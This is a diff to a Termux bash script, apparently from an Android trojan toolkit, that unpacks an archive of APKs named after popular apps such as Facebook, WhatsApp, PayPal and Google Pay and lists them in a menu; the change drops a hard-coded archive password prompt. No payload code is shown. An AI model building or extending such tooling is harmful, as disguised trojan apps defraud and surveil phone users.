@@ -16,12 +16,12 @@ fi ; }
 program() {
 if [ -f "/data/data/com.termux/files/home/Trojan/database/Facebook.apk" ];then
 echo -e "\e[1m
-[01] Aarogya Setu   [07] Facebook       [13] Google Pay      [19] PPSSPP     [0]
-[02] Calculator     [08] Files          [14] Google Photos   [20] Paypal     | |
-[03] Calendar       [09] Flipkart       [15] Google          [21] Play Store |E|
-[04] Camera         [10] Gmail          [16] Instagram       [22] Spotify    |X|
-[05] Elite          [11] Google Drive   [17] Messenger Lite  [23] Termux     |I|
-[06] Facebook Lite  [12] Google Keep    [18] Operamini       [24] WhatsApp   |T|
+[01] Aarogya Setu   [07] Facebook       [13] Google Pay      [19] PPSSPP
+[02] Calculator     [08] Files          [14] Google Photos   [20] Paypal
+[03] Calendar       [09] Flipkart       [15] Google          [21] Play Store
+[04] Camera         [10] Gmail          [16] Instagram       [22] Spotify
+[05] Elite          [11] Google Drive   [17] Messenger Lite  [23] Termux
+[06] Facebook Lite  [12] Google Keep    [18] Operamini       [24] WhatsApp
 \e[0m" | lolcat -a -s 100 -d 1 -t
 
 progress() {
@@ -295,21 +295,9 @@ fi
 fi ; } ; program
 
 if [ ! -f "/data/data/com.termux/files/home/Trojan/database/Facebook.apk" ];then
-echo
-echo -e "Files was encrypted = [ Password : \e[0;92m//2020 \e[0m]\n\n"
-
-printf "Enter Archive Password : \e[0;92m"
-read pass
-if [[ $pass = "//2020" ]];then
-printf "\e[0m"
-printf "Re-Enter Archive Password : "
 unrar x encrypt.rar > /dev/null 2>&1;
 if [ -f "/data/data/com.termux/files/home/Trojan/database/Facebook.apk" ];then
-echo -e "\e[0;92mDecrypted !"
-else echo -e "\e[0;91mPassword not matching... !" ;fi
 program
-else
-echo -e "\e[0;91mProgram aborted / Wrong password\e[0m"
 fi
 fi
 ###!Exit
